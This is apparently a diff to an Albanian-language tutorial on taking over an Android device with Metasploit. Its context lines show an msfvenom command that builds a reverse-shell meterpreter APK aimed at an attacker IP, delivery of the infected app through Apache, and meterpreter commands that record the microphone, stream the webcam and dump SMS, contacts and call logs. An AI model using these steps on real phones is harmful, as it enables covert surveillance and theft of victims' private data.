@@ -96,6 +96,8 @@ $ msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.0.12 LPORT=4444 R > 
 | R                          | raw format                                                           |
 | > /root/Desktop/OurApp.apk | lokacioni ku ruhet APK aplikacioni i krijuar                         |
 
+![Krijimi i apk fajllit](Foto/krijimi_i_apk_fajllit.gif)
+
 ### Kalimi i aplikacionit të infektuar tek pajisja e targetuar
 
 Për shkak që shumica e platformave online e detektojnë një fajll i cili ka përmajtje kërcënuese për sigurinë, kalimin e fajllit të infektuar nga sulmuesi tek viktima e bëjmë përmes web serverit të apache në linux. Sulmuesi e vendos fajllin e infetuar në lokacionin `/var/www/html/` dhe pajisja e viktimës duhet u çasur në browser në IP adresën e sulmuesit mund të gjej aplikacionin dhe ta instaloj. Komandat për ta startuar apache serverin janë:
@@ -104,6 +106,8 @@ Për shkak që shumica e platformave online e detektojnë një fajll i cili ka p
 $ service apache2 start
 $ service apache2 status
 ```
+
+![Kalimi i aplikacionit](Foto/kalimi_i_aplikacionit.gif)
 
 ### Shfrytëzimi i pajisjes së targetuar
 
@@ -145,6 +149,8 @@ Background e kalon lidhjen (sesionin) e krijuar nga payload me viktimën aktuale
 
 - `sessions` - shfaq listën e të gjithë sesioneve aktivë.
 - `sessions -i <numri i session>` - e merr nga prapavija sesionin e caktuar në bazë të numrit të specifikuar dhe kalon në meterpreter shell për atë sesion.
+
+![Komandat kryesore](Foto/komandat_kryesore.gif)
 
 ### Komandat e file sistemit
 
@@ -190,6 +196,9 @@ Stdapi: File system Commands
 
 Meqë kërkimi i fajllave në tërë hapsirën memorike të pajisjes së komprementuar është i kushtueshëm në kohë dhe përdoruesi i saj mund ta vërejë mbingarkesën, sygjerohet që kur kërkohet të specifikohet një pjesë e caktuar e memories për të reduktuar kohën e kërkimit.
 
+![Komandat e fajll sistemit](Foto/komandat_e_fajll_sistemit.gif)
+![Komandat e fajll sistemit](Foto/komandat_e_fajll_sistemit2.gif)
+
 ### Komandat e rrjetit
 
 ```
@@ -209,6 +218,8 @@ Stdapi: Networking Commands
 #### ipconfig
 
 `ipconfig`
+
+![Komandat e rrjetit](Foto/komandat_e_rrjetit.gif)
 
 ### Komandat e sistemit
 
@@ -240,6 +251,8 @@ Stdapi: System Commands
 
 `sysinfo`
 
+![Komandat e sistemit](Foto/komandat_e_sistemit.gif)
+
 ### Komandat e kamerës
 
 ```
@@ -262,6 +275,8 @@ Stdapi: Webcam Commands
 - `-f` lokacioni ku ruhet audio fajlli.
 - `-p` luan automatikisht audio fajllin e inçizuar (paraprakisht është e caktuar si true)
 
+![Komanda record_mic](Foto/komanda_record_mic.gif)
+
 #### webcam_list
 
 `webcam_list` liston të gjitha kamerat që i posedon pajisja e komprementuar dhe poashtu i identifikon ato me numra përkatës.
@@ -272,11 +287,17 @@ Stdapi: Webcam Commands
 
 - `-i` specifikon numrin identifikues të kamerës e cila përdoret.
 
+![Komanda webcam](Foto/komanda_webcam.gif)
+![Komanda webcam](Foto/komanda_webcam2.gif)
+
 #### webcam_stream
 
 `webcam_stream` përdorë kamerën e pajisjes së komprementuar për të pasur qasje të vazhdueshme në kohë reale të pamjes nga kamera (live streaming).
 
 - `-i` specifikon numrin identifikues të kamerës e cila përdoret.
+
+![Komanda webcam_stream](Foto/komanda_webcam_stream.gif)
+![Komanda webcam_stream](Foto/komanda_webcam_stream2.gif)
 
 ### Komandat e androidit
 
@@ -302,6 +323,8 @@ Android Commands
 
 `dump_calllog` nxjerr listën e të gjitha telefonatave të zhvilluara nga pajisja e komprementuar dhe e ruan atë në një tekst fajll duke specifikuar detajet e secilës thirrje.
 
+![Komandat e apndroidit](Foto/komandat_e_androidit.gif)
+
 #### dump_contacts
 
 `dump_contacts` nxjerr listën e të gjitha kontakteve të regjistruara në pajisjen e komprementuar dhe e ruan atë në një tekst fajll duke specifikuar detajet e secilit kontakt.
@@ -309,6 +332,8 @@ Android Commands
 #### dump_sms
 
 `dump_sms` nxjerr listë e sms-ëve të shkëmbyer nga pajisja e komprementuar dhe e ruan atë në një tekst fajll duke specifikuar detajet e secilit sms.
+
+![Komandat e android2](Foto/komandat_e_android2.gif)
 
 #### send_sms
 
@@ -347,6 +372,10 @@ Application Controller Commands
 
 `app_run` hap një aplikacion të caktuar që është i instaluar tek pajisja e komprementuar varësisht se cilin e zgjedhim.
 
+![Komandat e aplikacioneve](Foto/komandat_e_aplikacioneve.gif)
+
 #### app_unisntall
 
 `app_uninstall` shfaq dialogun për të fshirë një aplikacion të pajisjes.
+
+![Komandat e aplikacioneve2](Foto/komandat_e_aplikacioneve2.gif)
